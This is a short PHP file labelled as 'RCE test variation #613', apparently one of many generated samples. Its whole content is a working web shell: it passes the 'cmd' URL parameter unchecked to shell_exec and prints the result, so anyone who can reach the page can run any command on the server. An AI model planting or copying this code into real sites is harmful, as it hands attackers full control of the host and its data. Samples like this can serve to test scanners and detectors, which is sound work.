<?php
// RCE test variation #613
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>